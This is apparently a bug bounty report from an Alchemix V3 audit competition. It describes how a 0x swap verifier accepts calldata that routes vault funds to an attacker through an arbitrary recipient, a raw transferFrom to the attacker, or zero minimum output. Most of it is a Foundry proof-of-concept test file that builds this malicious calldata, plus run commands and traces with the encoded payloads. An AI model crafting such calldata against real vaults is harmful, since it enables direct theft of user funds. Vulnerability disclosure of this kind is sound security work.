# 58348 sc low zeroxswapverifier accepts malicious 0x calldata recipient not bound minout ignored transferfrom misused attacker can route strategy vault funds to self direct theft&#x20;

**Submitted on Nov 1st 2025 at 12:53:46 UTC by @manvi for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58348
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/ZeroXSwapVerifier.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

While analysing ZeroXSwapVerifier, I observed that top-level fields (recipient, buyToken, minAmountOut) are not enforced and per-action recipients are not pinned to a safe sink (e.g., the owner/strategy).

I also observed that the verifier allows a raw transferFrom(token, owner, attacker, amount) action as long as token == targetToken.

**I analysed three adversarial cases and the verifier returned true for all:**

UniswapV3 VIP with recipient = attacker

TRANSFER\_FROM with from = owner, to = attacker

basicSellToPool with recipient = attacker and minOut = 0

These behaviours collectively permit an attacker to craft calldata that passes verification and then steals funds when executed by the 0x Settler/Permit2 that holds the owner's allowance.

## Vulnerability Details

In the top-level execute verification path (e.g., \_verifyExecuteCalldata / \_verifyExecuteMetaTxnCalldata), the verifier does not check:

**saa.recipient == owner (or other allowed sink)**

**saa.buyToken == targetToken**

**saa.minAmountOut > 0**

In action verifiers (e.g., \_verifyUniswapV3VIP, \_verifyTransferFrom, \_verifySellToLiquidityProvider, etc.), the code does not bind the actio's recipient/to to owner and does not enforce a safe output target or meaningful slippage bound beyond a BPS cap.

For TRANSFER\_FROM, the check effectively reduces to token == targetToken, allowing from = owner and to = attacker to pass.

## Affected Code

src/utils/ZeroXSwapVerifier.sol: execute decoders and per-action verifiers (VIP/TRANSFER\_FROM/etc.) do not bind recipients or enforce minAmountOut / buyToken invariants.

## Attack Path / Scenario

Strategy/vault grants allowance to a 0x Settler or Permit2 (standard for swaps).

Attacker crafts 0x calldata that sets recipient = attacker (or encodes a raw transferFrom(owner, attacker, …)), and uses minOut = 0.

Calldata is passed through ZeroXSwapVerifier.verifySwapCalldata(...) and returns true.

The system proceeds to call the 0x Settler/Permit2 with that calldata; funds move to the attacker or are swapped with unlimited slippage.

## Preconditions

The component that moves funds relies on ZeroXSwapVerifier to gate 0x calls.

The strategy/vault (or owner) has token allowance set for the 0x Settler/Permit2 (typical in these designs).

No additional external checks that bind recipient/minOut/buyToken at the integration layer.

## Impact Details

Direct loss of user funds from strategies/vaults.

Depending on balances and automation, this could escalate towards protocol insolvency or widespread losses if repeatedly exploited.

## References

**Contract :** src/utils/ZeroXSwapVerifier.sol (branch immunefi\_audit)

## Proof of Concept

I created a Foundry test file ZeroXSwapVerifier\_Drain.t.sol.

My PoC builds malicious 0x actions and wraps them with an EXECUTE\_SELECTOR payload. It then calls:

```
  bool ok = ZeroXSwapVerifier.verifySwapCalldata(evil, owner, address(token), 1000);
```

and asserts ok == true. All three adversarial tests PASS, proving the verifier accepts payloads that:

**Direct outputs to attacker (arbitrary recipient),**

**Perform transferFrom(owner, attacker, amount), and**

**Use minOut = 0 with ignored recipient/buyToken at the top level.**

## What my POC does :

\_wrapExecute uses new bytes for a single action and new bytes trailing array.

**Tests that pass (vulnerable behaviour):**

test\_UniVIP\_AllowsArbitraryRecipient\_BUG()

test\_TransferFrom\_ToAttacker\_BUG()

test\_BasicSellToPool\_IgnoresRecipientAndMinOut\_BUG()

## Content of my POC file :

```
 pragma solidity ^0.8.28;

 import {Test} from "forge-std/Test.sol";
 import {ZeroXSwapVerifier} from "../utils/ZeroXSwapVerifier.sol";
 import {TestERC20} from "./mocks/TestERC20.sol";

 contract ZeroXSwapVerifier_Drain is Test {
     TestERC20 internal token;
     address internal owner    = makeAddr("OWNER");
     address internal attacker = makeAddr("ATTACKER");

     // Selectors copied from your existing test for consistency
     bytes4 private constant EXECUTE_SELECTOR = 0xcf71ff4f;
     bytes4 private constant UNISWAPV3_VIP    = 0x9ebf8e8d;
     bytes4 private constant TRANSFER_FROM    = 0x8d68a156;
     bytes4 private constant BASIC_SELL_TO_POOL = 0x5228831d;

     function setUp() public {
         token = new TestERC20(1_000e18, 18);
     }

     // === Builders (mirroring your ZeroXSwapVerifierTest helpers) ===

 function _wrapExecute(
     address recipient,
     address buyToken,
     uint256 minAmountOut,
     bytes memory action
 ) internal pure returns (bytes memory) {
     ZeroXSwapVerifier.SlippageAndActions memory saa =
         ZeroXSwapVerifier.SlippageAndActions({
             recipient: recipient,
             buyToken: buyToken,
             minAmountOut: minAmountOut,
             actions: new bytes[](1)
         });
     saa.actions[0] = action;
     return abi.encodeWithSelector(EXECUTE_SELECTOR, saa, new bytes[](0));
 }


     // UniswapV3 VIP action: uniswapV3VIP(address recipient, uint256 bps,   uint256 feeOrTick, bool feeOnTransfer, bytes fills)
     // We encode fills as (sellToken, sellAmount) exactly like your positive tests.
     function _uniVIPAction(address recipient, address sellToken, uint256 bps) internal pure returns (bytes memory) {
         bytes memory fills = abi.encode(sellToken, 100e18);
         return abi.encodeWithSelector(
             UNISWAPV3_VIP, recipient, bps, uint256(3000), false, fills
         );
     }

     // transferFrom(IERC20 token, address from, address to, uint256 amount)
     function _transferFromAction(address token_, address from, address to, uint256 amount) internal pure returns (bytes memory) {
         return abi.encodeWithSelector(TRANSFER_FROM, token_, from, to, amount);
     }

     // basicSellToPool(IERC20 sellToken, uint256 bps, address pool, uint256 offset, bytes data)
     function _basicSellToPoolAction(address sellToken, uint256 bps, address pool) internal pure returns (bytes memory) {
         return abi.encodeWithSelector(BASIC_SELL_TO_POOL, sellToken, bps, pool, uint256(0), bytes(""));
     }

     // === Adversarial tests ===

     // 1) UniswapV3 VIP: recipient is ATTACKER -> verifier should reject, but currently returns true (BUG).
     function test_UniVIP_AllowsArbitraryRecipient_BUG() public {
         bytes memory action = _uniVIPAction(attacker, address(token), 300); // bps <= limit
         bytes memory evil   = _wrapExecute(attacker, address(token)  /*buyToken*/, 0 /*minOut*/, action);

         bool ok = ZeroXSwapVerifier.verifySwapCalldata(
             evil, owner, address(token), 1000 /*maxSlippageBps*/
         );
         // If ok==true, verifier accepted attacker recipient => BUG confirmed
         assertTrue(ok, "verifier unexpectedly rejected attacker recipient; bug may be fixed");
     }

     // 2) TRANSFER_FROM: to=ATTACKER, from=OWNER -> verifier should require `from==owner` or pin recipient; it doesn't.
     function test_TransferFrom_ToAttacker_BUG() public {
         bytes memory action = _transferFromAction(address(token), owner, attacker, 1e18);
         bytes memory evil   = _wrapExecute(attacker, address(token), 0, action);

         bool ok = ZeroXSwapVerifier.verifySwapCalldata(
             evil, owner, address(token), 1000
         );
         assertTrue(ok, "verifier unexpectedly rejected attacker recipient; bug may be fixed");
     }

     // 3) basicSellToPool: no minOut enforced, buyToken & recipient ignored at top-level -> still passes
     function test_BasicSellToPool_IgnoresRecipientAndMinOut_BUG() public {
         bytes memory action = _basicSellToPoolAction(address(token), 500, makeAddr("POOL"));
         // Top-level recipient = attacker; minOut = 0
         bytes memory evil   = _wrapExecute(attacker, address(token), 0, action);

         bool ok = ZeroXSwapVerifier.verifySwapCalldata(
             evil, owner, address(token), 1000
         );
         assertTrue(ok, "verifier unexpectedly rejected; bug may be fixed");
     }
 }
```

## run my POC file :

```
 forge clean
 forge test -vvvv --evm-version cancun --match-path 'src/test/ZeroXSwapVerifier_Drain.t.sol'
```

## My console output :

```
 Ran 3 tests for      src/test/ZeroXSwapVerifier_Drain.t.sol:ZeroXSwapVerifier_Drain
 [PASS] test_BasicSellToPool_IgnoresRecipientAndMinOut_BUG() (gas:  94713)
 Traces:
   [94713]   ZeroXSwapVerifier_Drain::test_BasicSellToPool_IgnoresRecipientAndMinOu  t_BUG()
     ├─ [0] VM::addr(<pk>) [staticcall]
     │   └─ ← [Return] POOL:   [0xcB831800e7AD0F7f65Bc8617E5fD189A82918C95]
     ├─ [0] VM::label(POOL:   [0xcB831800e7AD0F7f65Bc8617E5fD189A82918C95], "POOL")
     │   └─ ← [Return]
     ├─ [71827]  ZeroXSwapVerifier::verifySwapCalldata(0xcf71ff4f00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000200000000000000000000000000a9bc1b39b17e3a6c86bb293debeff99e4ae4843f0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000c45228831d0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000000000000000000000000000000000000000000000000000000000001f4000000000000000000000000cb831800e7ad0f7f65bc8617e5fd189a82918c95000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, OWNER: [0x356f394005D3316ad54d8f22b40D02Cd539A4a3C],   TestERC20: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000)   [delegatecall]
     │   └─ ← [Return] true
     └─ ← [Return]

 [PASS] test_TransferFrom_ToAttacker_BUG() (gas: 67061)
 Traces:
   [67061] ZeroXSwapVerifier_Drain::test_TransferFrom_ToAttacker_BUG()
     ├─ [50597] ZeroXSwapVerifier::verifySwapCalldata(0xcf71ff4f000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000001c0000000000000000000000000a9bc1b39b17e3a6c86bb293debeff99e4ae4843f0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000848d68a1560000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000356f394005d3316ad54d8f22b40d02cd539a4a3c000000000000000000000000a9bc1b39b17e3a6c86bb293debeff99e4ae4843f0000000000000000000000000000000000000000000000000de0b6b3a7640000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, OWNER: [0x356f394005D3316ad54d8f22b40D02Cd539A4a3C], TestERC20: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000) [delegatecall]
     │   └─ ← [Return] true
     └─ ← [Return]

 [PASS] test_UniVIP_AllowsArbitraryRecipient_BUG() (gas: 121876)
 Traces:
   [121876]      ZeroXSwapVerifier_Drain::test_UniVIP_AllowsArbitraryRecipient_BUG()
     ├─ [105167]  ZeroXSwapVerifier::verifySwapCalldata(0xcf71ff4f00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000240000000000000000000000000a9bc1b39b17e3a6c86bb293debeff99e4ae4843f0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000001049ebf8e8d000000000000000000000000a9bc1b39b17e3a6c86bb293debeff99e4ae4843f000000000000000000000000000000000000000000000000000000000000012c0000000000000000000000000000000000000000000000000000000000000bb8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000400000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000056bc75e2d63100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, OWNER:  [0x356f394005D3316ad54d8f22b40D02Cd539A4a3C], TestERC20:  [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000) [delegatecall]
     │   └─ ← [Return] true
     └─ ← [Return]

 Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 3.34ms (2.19ms CPU time)

 Ran 1 test suite in 15.23ms (3.34ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

## what my POC proved :

**The verifier accepts malicious calldata.**

My tests call ZeroXSwapVerifier.verifySwapCalldata(evil, owner, address(token), 1000) and it returns true for payloads that should be rejected. That's the core bug.

**Arbitrary recipient is allowed (UniswapV3 VIP).**

test\_UniVIP\_AllowsArbitraryRecipient\_BUG() shows I can set recipient = attacker inside the VIP action and the verifier still returns true. -> Proves: recipient isn't bound/pinned to the owner or another safe sink.

**Direct transfer to attacker is allowed (TRANSFER\_FROM).**

test\_TransferFrom\_ToAttacker\_BUG() encodes transferFrom(token, from=owner, to=attacker, amount) and wraps it in an accepted execute payload. Verifier returns true. -> Proves: no check on to, and no requirement that from == owner be the only allowed flow to a safe destination.

**Slippage/minOut and outputs aren't enforced (basicSellToPool).**

test\_BasicSellToPool\_IgnoresRecipientAndMinOut\_BUG() uses minOut = 0 and recipient = attacker; verifier still returns true. -> Proves: minAmountOut / buyToken aren't enforced at the top level and action outputs aren't bound.

In a real integration, once a vault/strategy has given allowance to the 0x Settler/Permit2, any calldata that passes this verifier will be executed. Since my PoC shows the verifier accepts attacker-chosen recipients and raw transferFrom(owner->attacker), an attacker can steal funds or force unbounded slippage.
